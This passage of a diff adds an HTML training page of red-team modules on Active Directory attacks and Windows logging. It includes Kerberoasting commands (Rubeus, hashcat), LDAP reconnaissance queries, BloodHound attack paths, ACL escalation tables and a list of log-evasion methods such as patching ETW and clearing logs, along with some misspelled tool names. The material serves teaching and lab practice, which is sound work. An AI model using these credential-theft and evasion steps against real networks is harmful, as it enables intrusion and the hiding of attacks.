+│  │  ┌─────────────────────────────────┐  │  │
+│  │  │ Domain Controllers (DC=DC)      │  │  │
+│  │  │  ├─ CN=DC-01                    │  │  │
+│  │  │  └─ CN=DC-02                    │  │  │
+│  │  ├─────────────────────────────────┤  │  │
+│  │  │ Users (CN=Users)                │  │  │
+│  │  │  ├─ CN=Administrator            │  │  │
+│  │  │  ├─ CN=sql_svc                  │  │  │
+│  │  │  └─ CN=John.Doe                │  │  │
+│  │  ├─────────────────────────────────┤  │  │
+│  │  │ Computers (CN=Computers)        │  │  │
+│  │  │  ├─ CN=WS-001                   │  │  │
+│  │  │  └─ CN=SRV-SQL                  │  │  │
+│  │  ├─────────────────────────────────┤  │  │
+│  │  │ Groups (CN=Groups)              │  │  │
+│  │  │  ├─ CN=Domain Admins            │  │  │
+│  │  │  ├─ CN=SQL Admins               │  │  │
+│  │  │  └─ CN=Helpdesk                 │  │  │
+│  │  └─────────────────────────────────┘  │  │
+│  └───────────────────────────────────────┘  │
+│  ┌───────────────────────────────────────┐  │
+│  │  Child Domain (europe.contoso.com)    │  │
+│  │  └─ ...same structure                 │  │
+│  └───────────────────────────────────────┘  │
+└─────────────────────────────────────────────┘</div>
+
+<h3>LDAP and Directory Access</h3>
+<p>The Lightweight Directory Access Protocol (LDAP) is the primary protocol for querying and modifying Active Directory. Domain Controllers run an LDAP server on port 389 (LDAP) and 636 (LDAPS). Tools like <span class="cmd">ldapsearch</span>, <span class="cmd">AdFind</span>, and PowerShell's <span class="cmd">Get-ADUser</span> use LDAP to query directory objects. Understanding LDAP query syntax is essential for reconnaissance in AD environments.</p>
+
+<div class="cb"><span class="cmt"># LDAP query examples for AD reconnaissance</span>
+<span class="cmd"># Find all domain admin users</span>
+(&amp;(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=contoso,DC=com))
+
+<span class="cmd"># Find all service accounts (never expire password)</span>
+(&amp;(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))
+
+<span class="cmd"># Find all computers with constrained delegation</span>
+(&amp;(objectClass=computer)(msDS-AllowedToDelegateTo=*))
+
+<span class="cmd"># Find all domain controllers</span>
+(&amp;(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))</div>
+
+<h3>Kerberoasting</h3>
+<p>Kerberoasting is a technique for extracting service account credentials from Active Directory. Any domain user can request a service ticket (TGS) for any service in the domain. The TGS is encrypted with the service account's NTLM hash. By requesting TGS tickets for multiple services, cracking the encryption (RC4 or AES) offline yields the service account passwords. This is one of the most common AD attack techniques because it requires no special privileges and can be performed remotely.</p>
+
+<div class="ab"><strong>Attack Relevance:</strong> The <span class="cmd">Set-SPN</span> attribute (ServicePrincipalName) identifies which accounts are service accounts. Tools like <span class="cmd">Rubeus</span> and <span class="cmd">Impacket's GetUserSPNs.py</span> automate the Kerberoasting process. The resulting tickets can be cracked with <span class="cmd">hashcat</span> using mode <span class="val">13100</span> for TGS-REP hashes. Service accounts often have weak, shared, or default passwords, making them prime targets.</div>
+
+<h3>BloodHound and Attack Path Mapping</h3>
+<p>BloodHound is a tool that maps relationships in Active Directory and identifies attack paths to high-value targets (Domain Admins, Enterprise Admins). It uses a graph database (Neo4j) to visualize how objects are connected through group memberships, ACLs, sessions, and delegation. BloodHound's collectors (<span class="cmd">SharpHound</span>) query AD for all objects, ACLs, group memberships, and session information.</p>
+
+<div class="ascii">Common BloodHound Attack Paths:
+┌──────────┐     memberOf     ┌──────────────┐
+│ User A   │────────────────→│ Domain Admins │
+└────┬─────┘                 └──────────────┘
+     │ AdminTo
+     ▼
+┌──────────┐     HasSession  ┌──────────┐
+│ Server-1 │←───────────────│ User B   │
+└────┬─────┘                 └──────────┘
+     │ AdminTo
+     ▼
+┌──────────┐     memberOf     ┌──────────────┐
+│ DC-01    │────────────────→│ Domain Admins │
+└──────────┘                 └──────────────┘
+
+Path: User A → AdminTo(Server-1) → HasSession(User B)
+      → AdminTo(DC-01) → memberOf(Domain Admins)</div>
+
+<div class="ib">BloodHound queries are executed via Cypher, Neo4j's query language. A query to find all users with administrative access to domain controllers: <span class="cmd">MATCH (u:User)-[:AdminTo]->(c:Computer {UnconstrainedDelegation:true}) RETURN u.name, c.name</span>. The console version also provides pre-built analytics queries.
+
+<h3>ACL-Based Attacks</h3>
+<p>Active Directory access control lists (ACLs) define permissions on AD objects. Misconfigured ACLs are one of the most common and dangerous vulnerabilities in AD. Attackers with <span class="cmd">GenericAll</span>, <span class="cmd">GenericWrite</span>, <span class="cmd">WriteOwner</span>, <span class="cmd">WriteDacl</span>, or <span class="cmd">ForceChangePassword</span> on a privileged object can escalate privileges. For example, <span class="cmd">GenericAll</span> on a user object allows changing their password, while <span class="cmd">ForceChangePassword</span> on a domain admin allows taking over that account.</p>
+
+<table class="dtable">
+<tr><th>ACL Right</th><th>Effect</th><th>Escalation Path</th></tr>
+<tr><td>GenericAll</td><td>Full control over object</td><td>Reset password, add to group</td></tr>
+<tr><td>GenericWrite</td><td>Modify object attributes</td><td>Set SPN for Kerberoast, set logon script</td></tr>
+<tr><td>WriteOwner</td><td>Change object ownership</td><td>Take ownership, then modify ACL</td></tr>
+<tr><td>WriteDacl</td><td>Modify object ACL</td><td>Grant self GenericAll</td></tr>
+<tr><td>ForceChangePassword</td><td>Reset user password</td><td>Take over user account</td></tr>
+<tr><td>AddMember</td><td>Add to group</td><td>Add self to privileged group</td></tr>
+</table>
+
+<div class="lb"><strong>Lab:</strong> Set up a lab Active Directory environment with VirtualBox or VMware. Create users, groups, and service accounts. Use <span class="cmd">Rubeus</span> to perform Kerberoasting: <span class="cmd">Rubeus.exe kerberoast /nowrap</span>. Crack the resulting hash with hashcat: <span class="cmd">hashcat -m 13100 hash.txt wordlist.txt</span>. Then install BloodHound and SharpHound, collect data from the lab domain, and identify attack paths to Domain Admin.</div>
+
+<div class="wb">Modern Active Directory has additional protections. <span class="cmd">Protected Users</span> group members cannot be Kerberoasted. Group Managed Service Accounts (gMSAs) have automatic password rotation. Authentication policies can restrict when and how accounts authenticate. <span class="cmd">LAPS</span> (Local Administrator Password Solution) randomizes local admin passwords on domain-joined computers.</div>
+
+<div class="mm">Mental Model: Active Directory is a massive address book with security badges. LDAP is flipping through the pages. Group membership is your badge level - blue badge (user), red badge (admin). ACLs are who can edit which pages in the address book. Kerberoasting is like getting a ticket to an event encrypted with a password - and cracking that password offline. BloodHound is a map of every door, key, and keyholder in the building.</div>
+
+<div class="cl-item">Explain the logical structure of an Active Directory forest, domain, and OU</div>
+<div class="cl-item">Perform a Kerberoasting attack to extract service account credentials</div>
+<div class="cl-item">Describe how BloodHound maps AD attack paths using graph theory</div>
+<div class="cl-item">Identify misconfigured ACLs that enable privilege escalation</div>
+<div class="cl-item">Query Active Directory using LDAP for reconnaissance purposes</div>
+`
+},
+{
+id: 'module-10',
+title: 'Windows Logging and Event IDs',
+tag: 'FORENSICS',
+count: 5,
+content: `
+<p>Windows generates a rich set of security and operational logs through Event Tracing for Windows (ETW) and the Windows Event Log system. For red team operators, understanding what events are generated by different actions is essential for operational security (OPSEC) - knowing when you are generating logs, what those logs contain, and how to minimize or evade them. For blue teamers, these events are the foundation of detection and incident response.</p>
+
+<p>The Windows Event Log organizes logs into three primary categories: <span class="cmd">System</span>, <span class="cmd">Application</span>, and <span class="cmd">Security</span>. The Security log is the most relevant for red team operations, as it records authentication events (logons), process creation, object access, and privilege usage. The Security log can be read with <span class="cmd">Event Viewer</span>, <span class="cmd">wevtutil</span>, or PowerShell's <span class="cmd">Get-WinEvent</span> cmdlet.</p>
+
+<div class="ascii">Windows Event Log Architecture:
+┌─────────────────────────────────────────────┐
+│       Event Sources (ETW Providers)        │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐  │
+│  │ Kernel   │  │ Security │  │ App      │  │
+│  │ Provider │  │ Provider │  │ Providers│  │
+│  │ (Process │  │ (LSASS)  │  │ (.NET,   │  │
+│  │ ,Network)│  │          │  │  SQL...) │  │
+│  └──────────┘  └──────────┘  └──────────┘  │
+│         │           │            │          │
+│  ┌──────┴───────────┴────────────┴──────┐   │
+│  │       Event Log Service               │   │
+│  │       (wevtsvc / EventLog)            │   │
+│  └──────┬───────────────────────────────┘   │
+│  ┌──────┴───────────────────────────────┐   │
+│  │      .evtx Files (on disk)           │   │
+│  │  Security.evtx │ System.evtx         │   │
+│  │  Application.evtx │ *.evtx           │   │
+│  └──────────────────────────────────────┘   │
+└─────────────────────────────────────────────┘</div>
+
+<h3>Critical Security Event IDs</h3>
+<p>The following event IDs are the most important for red team operators to understand. Each corresponds to specific actions that are logged by default or through Advanced Audit Policy configuration.</p>
+
+<table class="dtable">
+<tr><th>Event ID</th><th>Description</th><th>Red Team Relevance</th></tr>
+<tr><td>4624</td><td>An account was successfully logged on</td><td>Logon type 2 (interactive), 3 (network), 9 (RunAs)</td></tr>
+<tr><td>4625</td><td>An account failed to log on</td><td>Password spraying attempts</td></tr>
+<tr><td>4634</td><td>An account was logged off</td><td>End of logon session</td></tr>
+<tr><td>4648</td><td>A logon was attempted using explicit credentials</td><td>RunAs, scheduled task with credentials</td></tr>
+<tr><td>4672</td><td>Special privileges assigned to new logon</td><td>SYSTEM or admin logon</td></tr>
+<tr><td>4688</td><td>A new process has been created</td><td>All process execution tracking</td></tr>
+<tr><td>4698</td><td>A scheduled task was created</td><td>Persistence detection</td></tr>
+<tr><td>4700</td><td>A scheduled task was enabled</td><td>Task activation</td></tr>
+<tr><td>4703</td><td>A user right was adjusted</td><td>Privilege usage (SeDebugPrivilege, etc.)</td></tr>
+<tr><td>4719</td><td>System audit policy was changed</td><td>Log tampering detection</td></tr>
+<tr><td>4720</td><td>A user account was created</td><td>Backdoor account creation</td></tr>
+<tr><td>4732</td><td>A member was added to a security-enabled local group</td><td>Admin group escalation</td></tr>
+<tr><td>4738</td><td>A user account was changed</td><td>Account attribute modification</td></tr>
+<tr><td>5140</td><td>A network share object was accessed</td><td>Lateral movement via SMB</td></tr>
+<tr><td>5156</td><td>The Windows Filtering Platform permitted a connection</td><td>Network connection monitoring</td></tr>
+</table>
+
+<div class="ab"><strong>Attack Relevance:</strong> Event ID <span class="cmd">4688</span> (Process Creation) includes command-line auditing when enabled. This logs the full command line of every executed process, including arguments, making it one of the most important detection events. C2 frameworks that pass arguments on the command line (e.g., <span class="cmd">powershell.exe -EncodedCommand &lt;base64&gt;</span>) are immediately visible. Using <span class="cmd">CmdLine</span> truncation or alternative execution methods (WMI, COM objects, services) can reduce visibility.</div>
+
+<h3>Event ID 4624: Logon Types</h3>
+<p>The LogonType field in event 4624 indicates the method of authentication. This is critical for understanding how credentials are being used in the environment:</p>
+
+<table class="dtable">
+<tr><th>Logon Type</th><th>Name</th><th>Description</th></tr>
+<tr><td>2</td><td>Interactive</td><td>Local console logon (physical or RDP)</td></tr>
+<tr><td>3</td><td>Network</td><td>Network authentication (SMB, NetLogon)</td></tr>
+<tr><td>4</td><td>Batch</td><td>Scheduled task or batch job</td></tr>
+<tr><td>5</td><td>Service</td><td>Windows service startup</td></tr>
+<tr><td>7</td><td>Unlock</td><td>Workstation unlock</td></tr>
+<tr><td>8</td><td>NetworkCleartext</td><td>Network with cleartext credentials (IIS)</td></tr>
+<tr><td>9</td><td>NewCredentials</td><td>RunAs with different credentials</td></tr>
+<tr><td>10</td><td>RemoteInteractive</td><td>Remote Desktop (RDP) logon</td></tr>
+<tr><td>11</td><td>CachedInteractive</td><td>Logon with cached domain credentials</td></tr>
+</table>
+
+<h3>Sysmon (System Monitor)</h3>
+<p>Sysmon is a Sysinternals tool that extends Windows logging with detailed event data. It installs as a kernel-mode driver and a Windows service, providing events that go far beyond the standard Windows Security log. Sysmon is widely deployed in enterprise environments for detection and incident response.</p>
+
+<div class="cb"><span class="cmt"># Common Sysmon Event IDs for Red Teamers</span>
+<span class="cmt"># Event 1: Process creation (more detailed than 4688)</span>
+<span class="cmt">#   - Includes ProcessID, ParentProcessID, Image, CommandLine</span>
+<span class="cmt">#   - Hashes (MD5, SHA1, SHA256) of the executable</span>
+<span class="cmt"># Event 3: Network connection</span>
+<span class="cmt">#   - Source IP/port, Destination IP/port, protocol</span>
+<span class="cmt">#   - Process that initiated the connection</span>
+<span class="cmt"># Event 7: Image loaded (DLL load tracking)</span>
+<span class="cmt">#   - Detects DLL hijacking and side-loading</span>
+<span class="cmt"># Event 8: CreateRemoteThread (cross-process injection)</span>
+<span class="cmt">#   - Flags: SourceProcessID, TargetProcessID</span>
+<span class="cmt">#   - High-fidelity detection of process injection</span>
+<span class="cmt"># Event 10: Process access (OpenProcess)</span>
+<span class="cmt">#   - Detects LSASS access (Mimikatz)</span>
+<span class="cmt"># Event 11: File create</span>
+<span class="cmt">#   - Dropped executables or scripts</span>
+<span class="cmt"># Event 13: Registry value set</span>
+<span class="cmt">#   - Registry persistence detection</span>
+<span class="cmt"># Event 15: FileCreateStreamHash</span>
+<span class="cmt">#   - Alternate Data Stream detection</span></div>
+
+<div class="ib">Sysmon's <span class="cmd">CreateRemoteThread</span> detection (Event 8) is one of the most effective detections for process injection. It logs the source and target process IDs, the thread entry point, and the start address. If the start address is in a non-image region (e.g., allocated memory), it is a clear indicator of injection. Direct syscall thread creation may bypass Sysmon's user-mode hooks but will not bypass the kernel-mode callbacks.</div>
+
+<h3>Log Evasion Considerations</h3>
+<p>While completely avoiding all logging is difficult, several techniques can reduce the forensic footprint:
+<span class="cmd">(1)</span> Patching ETW providers to disable specific event sources (detected by integrity checks),
+<span class="cmd">(2)</span> Using <span class="cmd">WEVTIL</span> to clear or modify logs (requires admin, generates its own event),
+<span class="cmd">(3)</span> Disabling the Windows Event Log service (obvious and generates alerts),
+<span class="cmd">(4)</span> Exploiting log size limits to overwrite evidence (slow and unreliable),
+<span class="cmd">(5)</span> Using <span class="cmd">Enable-Privelege</span> to manipulate audit policies (detected by 4719),
+<span class="cmd">(6)</span> Redirecting ETW events to an inaccessible alternate consumer.</p>
+
+<div class="lb"><strong>Lab:</strong> Enable Advanced Audit Policy on a test Windows system. Use <span class="cmd">secpol.msc</span> to enable "Audit Process Creation" with command-line auditing. Then perform a series of actions (logon, run cmd.exe, create a scheduled task, modify the registry) and use <span class="cmd">Get-WinEvent -LogName Security</span> to find the corresponding event IDs. Create a filter that shows only events for your actions. Then install Sysmon with a default configuration and observe the additional events generated (especially Event 1 vs 4688 differences).</div>
+
+<div class="wb">Security Information and Event Management (SIEM) systems aggregate logs from multiple sources: Windows Event Log, Sysmon, network logs, and endpoint telemetry. Understanding what events a SIEM correlates is essential for operational security. For example, a SIEM might correlate a service creation event (7045) followed by a network connection from that service (5156) as a C2 indicator. Breaking these chains by using trusted processes or encrypted traffic reduces detection.</div>
+
+<div class="mm">Mental Model: Event logs are the security camera footage of the Windows world. Every action leaves a trace. Event ID 4688 is a camera pointing at the front door (process creation). AMSI scanning is a guard patting down scripts before they enter. Sysmon Event 8 is a motion sensor on every window (process injection). You can't disable the cameras without someone noticing, but you can wear disguises, use the right doors, and avoid triggering motion sensors.</div>
+
+<div class="cl-item">Identify and explain at least 10 critical Windows Security event IDs</div>
+<div class="cl-item">Distinguish between logon types in event ID 4624 and their implications</div>
+<div class="cl-item">Describe how Sysmon extends Windows logging for process injection detection</div>
+<div class="cl-item">Explain how SIEM correlation chains can detect multi-stage attacks</div>
+<div class="cl-item">Query the Windows Event Log using PowerShell to find specific security events</div>
+`
+}
+];
+
+function buildPage() {
+const nav = document.getElementById('sidebarNav');
+const area = document.getElementById('contentArea');
+
+modules.forEach((mod, idx) => {
+const li = document.createElement('li');
+const a = document.createElement('a');
+a.href = '#' + mod.id;
+a.innerHTML = `<span class="nav-num">${String(idx+1).padStart(2,'0')}</span><span class="nav-label">${mod.title}</span><span class="nav-dot" data-module="${mod.id}"></span>`;
+a.addEventListener('click', (e) => {
+document.querySelectorAll('.sidebar-nav a').forEach(el => el.classList.remove('active'));
+a.classList.add('active');
+});
+li.appendChild(a);
+nav.appendChild(li);
+
+const card = document.createElement('div');
+card.className = 'module-card';
+card.id = mod.id;
+card.innerHTML = `
+<div class="module-header">
+<div><span class="module-title">${mod.title}</span><span class="module-tag">${mod.tag}</span></div>
+<div style="display:flex;align-items:center;gap:10px;">
+<span class="module-count">${mod.count} items</span>
+<span class="module-chevron">&#9654;</span>
+</div>
+</div>
+<div class="module-body">${mod.content}</div>
+`;
+area.appendChild(card);
+});
+
+document.querySelectorAll('.module-header').forEach(header => {
+header.addEventListener('click', function() {
+const card = this.parentElement;
+const isOpen = card.classList.contains('open');
+card.classList.toggle('open');
+const mid = card.id;
+if (card.classList.contains('open')) {
+localStorage.setItem('modopen_' + mid, '1');
+} else {
+localStorage.removeItem('modopen_' + mid);
+}
+updateProgress();
+});
+});
+
+document.querySelectorAll('.cl-item').forEach(item => {
+item.addEventListener('click', function() {
+this.classList.toggle('done');
+const items = this.closest('.module-body').querySelectorAll('.cl-item');
+const mid = this.closest('.module-card').id;
+const done = [];
+items.forEach((it, i) => { if (it.classList.contains('done')) done.push(i); });
+localStorage.setItem('checklist_' + mid, JSON.stringify(done));
+updateProgress();
+});
+});
+
+modules.forEach(mod => {
+const saved = localStorage.getItem('modopen_' + mod.id);
+if (saved === '1') {
+const card = document.getElementById(mod.id);
+if (card) card.classList.add('open');
+}
+const checkItems = document.getElementById(mod.id)?.querySelectorAll('.cl-item');
+if (checkItems) {
+const savedState = localStorage.getItem('checklist_' + mod.id);
+if (savedState) {
+try {
+const done = JSON.parse(savedState);
+done.forEach(idx => { if (checkItems[idx]) checkItems[idx].classList.add('done'); });
+} catch(e) {}
+}
+}
+});
+
+updateProgress();
+}
+
+function updateProgress() {
+let total = 0, done = 0;
+document.querySelectorAll('.module-card').forEach(card => {
+const items = card.querySelectorAll('.cl-item');
+const mid = card.id;
+items.forEach(item => {
+total++;
+if (item.classList.contains('done')) done++;
+});
+const dot = document.querySelector(`.nav-dot[data-module="${mid}"]`);
+if (dot) {
+const allDone = items.length > 0 && Array.from(items).every(i => i.classList.contains('done'));
+dot.classList.toggle('done', allDone);
+}
+});
+const pct = total > 0 ? Math.round((done / total) * 100) : 0;
+document.getElementById('progressText').textContent = `${done}/${total}`;
+document.getElementById('progressFill').style.width = pct + '%';
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+buildPage();
+document.querySelectorAll('.sidebar-nav a').forEach(a => {
+a.addEventListener('click', function(e) {
+e.preventDefault();
+const target = document.querySelector(this.getAttribute('href'));
+if (target) {
+target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+});
+});
+});
+</script>
+</body>
+</html>
